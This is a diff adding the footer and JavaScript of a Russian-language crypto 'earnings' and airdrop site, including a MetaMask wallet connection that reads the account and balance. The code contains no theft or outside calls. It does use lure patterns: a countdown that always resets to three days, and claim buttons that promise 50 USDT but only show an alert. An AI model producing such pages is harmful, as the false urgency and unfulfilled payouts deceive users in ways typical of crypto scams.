+                <h3>Заработок</h3>
+                <ul class="footer-links">
+                    <li><a href="#">Стейкинг</a></li>
+                    <li><a href="#">Майнинг</a></li>
+                    <li><a href="#">Трейдинг</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h3>Поддержка</h3>
+                <ul class="footer-links">
+                    <li><a href="#">FAQ</a></li>
+                    <li><a href="#">Контакты</a></li>
+                    <li><a href="#">Техподдержка</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="copyright">
+            <p>&copy; 2023 CryptoRichLife. Все права защищены</p>
+        </div>
+    </footer>
+
+    <script>
+        // Навигация между страницами
+        document.addEventListener('DOMContentLoaded', function() {
+            const navLinks = document.querySelectorAll('.nav-link');
+            const pages = document.querySelectorAll('.page');
+            
+            // Функция переключения страниц
+            function showPage(pageId) {
+                // Скрыть все страницы
+                pages.forEach(page => {
+                    page.classList.remove('active');
+                });
+                
+                // Показать выбранную страницу
+                document.getElementById(pageId).classList.add('active');
+                
+                // Обновить активную ссылку в навигации
+                navLinks.forEach(link => {
+                    link.classList.remove('active');
+                    if (link.getAttribute('data-page') === pageId) {
+                        link.classList.add('active');
+                    }
+                });
+                
+                // Прокрутить к верху страницы
+                window.scrollTo(0, 0);
+            }
+            
+            // Обработчики для навигационных ссылок
+            navLinks.forEach(link => {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const pageId = this.getAttribute('data-page');
+                    showPage(pageId);
+                });
+            });
+            
+            // Обработчики для кнопок
+            document.querySelectorAll('.btn[data-page]').forEach(btn => {
+                btn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const pageId = this.getAttribute('data-page');
+                    showPage(pageId);
+                });
+            });
+            
+            // Обработчики для форм
+            document.getElementById('earnForm')?.addEventListener('submit', function(e) {
+                e.preventDefault();
+                alert('Ваша заявка на заработок принята! С вами свяжется наш специалист.');
+                showPage('reviews');
+            });
+            
+            document.getElementById('reviewForm')?.addEventListener('submit', function(e) {
+                e.preventDefault();
+                alert('Спасибо за ваш отзыв! Он будет опубликован после модерации.');
+            });
+            
+            document.getElementById('contactForm')?.addEventListener('submit', function(e) {
+                e.preventDefault();
+                alert('Ваше сообщение отправлено! Мы ответим вам в течение 24 часов.');
+            });
+            
+            // Обработчики для карточек кошельков
+            document.querySelectorAll('.wallet-card').forEach(card => {
+                card.addEventListener('click', function() {
+                    const walletType = this.getAttribute('data-wallet');
+                    connectWallet(walletType, 'page');
+                });
+            });
+            
+            // Обработчики для кнопок подключения кошельков
+            document.querySelectorAll('.wallet-connect-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const walletType = this.getAttribute('data-wallet');
+                    
+                    if (window.location.hash === '#airdrop' || document.getElementById('airdrop').classList.contains('active')) {
+                        connectWallet(walletType, 'airdrop');
+                    } else {
+                        connectWallet(walletType, 'page');
+                    }
+                });
+            });
+            
+            // Кнопка получения аирдропа
+            document.getElementById('claimAirdrop')?.addEventListener('click', function() {
+                const email = document.getElementById('airdropEmail').value;
+                if (!email) {
+                    alert('Пожалуйста, введите ваш email');
+                    return;
+                }
+                
+                alert('Заявка на участие в аирдропе принята! 50 USDT будут начислены на ваш кошелек в течение 24 часов.');
+            });
+            
+            // Отключение кошелька
+            document.getElementById('disconnectWallet')?.addEventListener('click', function() {
+                document.getElementById('walletInfo').style.display = 'none';
+                document.querySelectorAll('.wallet-card').forEach(c => {
+                    c.style.borderColor = 'rgba(255, 255, 255, 0.1)';
+                });
+                alert('Кошелек отключен');
+            });
+            
+            // Таймер обратного отсчета для аирдропа
+            function updateCountdown() {
+                const countdownElement = document.getElementById('countdown');
+                const homeCountdownElement = document.getElementById('homeCountdown');
+                if (countdownElement || homeCountdownElement) {
+                    // Установим время до конца акции (3 дня)
+                    const now = new Date();
+                    const endDate = new Date(now.getTime() + 3 * 24 * 60 * 60 * 1000);
+                    
+                    const timeLeft = endDate - now;
+                    
+                    const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                    const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                    const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+                    
+                    const timeString = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                    
+                    if (countdownElement) countdownElement.textContent = timeString;
+                    if (homeCountdownElement) homeCountdownElement.textContent = timeString;
+                }
+            }
+            
+            // Запуск таймера
+            setInterval(updateCountdown, 1000);
+            updateCountdown();
+            
+            // Функция подключения кошелька
+            async function connectWallet(walletType, context = 'main') {
+                // Проверяем, установлен ли MetaMask
+                if (typeof window.ethereum !== 'undefined') {
+                    try {
+                        // Запрашиваем подключение аккаунтов
+                        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                        const account = accounts[0];
+                        
+                        // Получаем баланс
+                        const balance = await window.ethereum.request({ 
+                            method: 'eth_getBalance', 
+                            params: [account, 'latest'] 
+                        });
+                        
+                        // Конвертируем баланс из wei в ETH
+                        const balanceInEth = parseInt(balance) / 1e18;
+                        
+                        // Получаем информацию о сети
+                        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                        let networkName = 'Unknown';
+                        
+                        switch (chainId) {
+                            case '0x1':
+                                networkName = 'Ethereum Mainnet';
+                                break;
+                            case '0x3':
+                                networkName = 'Ropsten Testnet';
+                                break;
+                            case '0x4':
+                                networkName = 'Rinkeby Testnet';
+                                break;
+                            case '0x5':
+                                networkName = 'Goerli Testnet';
+                                break;
+                            case '0x2a':
+                                networkName = 'Kovan Testnet';
+                                break;
+                            case '0x89':
+                                networkName = 'Polygon Mainnet';
+                                break;
+                            case '0x13881':
+                                networkName = 'Mumbai Testnet';
+                                break;
+                            default:
+                                networkName = `Unknown (${chainId})`;
+                        }
+                        
+                        // Обновляем интерфейс в зависимости от контекста
+                        if (context === 'main') {
+                            document.getElementById('walletConnected').style.display = 'block';
+                            document.getElementById('walletAddress').textContent = account;
+                            document.getElementById('walletBalance').textContent = `${balanceInEth.toFixed(4)} ETH`;
+                            document.getElementById('walletNetwork').textContent = networkName;
+                        } else if (context === 'page') {
+                            document.getElementById('walletInfo').style.display = 'block';
+                            document.getElementById('walletPageAddress').textContent = account;
+                            document.getElementById('walletPageBalance').textContent = `${balanceInEth.toFixed(4)} ETH`;
+                            document.getElementById('walletPageNetwork').textContent = networkName;
+                        } else if (context === 'airdrop') {
+                            document.getElementById('connectWalletAirdrop').style.display = 'none';
+                            document.getElementById('walletConnectedAirdrop').style.display = 'block';
+                            document.getElementById('airdropWalletAddress').textContent = account;
+                        }
+                        
+                        // Подсветка выбранного кошелька
+                        document.querySelectorAll('.wallet-card').forEach(c => {
+                            c.style.borderColor = 'rgba(255, 255, 255, 0.1)';
+                        });
+                        
+                        const selectedCard = document.querySelector(`.wallet-card[data-wallet="${walletType}"]`);
+                        if (selectedCard) {
+                            selectedCard.style.borderColor = 'var(--accent)';
+                        }
+                        
+                        alert(`Кошелек ${walletType} успешно подключен!`);
+                        
+                    } catch (error) {
+                        console.error(error);
+                        alert('Произошла ошибка при подключении кошелька. Убедитесь, что MetaMask установлен и разблокирован.');
+                    }
+                } else {
+                    alert('MetaMask не установлен. Пожалуйста, установите MetaMask для подключения кошелька.');
+                    window.open('https://metamask.io/download.html', '_blank');
+                }
+            }
+            
+            // Обработчик для кнопки подключения кошелька на главной
+            document.getElementById('connectWalletBtn').addEventListener('click', function() {
+                connectWallet('metamask', 'main');
+            });
+            
+            // Обработчик для кнопки получения аирдропа на главной
+            document.getElementById('claimAirdropBtn').addEventListener('click', function() {
+                alert('Заявка на участие в аирдропе принята! 50 USDT будут начислены на ваш кошелек в течение 24 часов.');
+            });
+        });
+    </script>
+</body>
+</html>
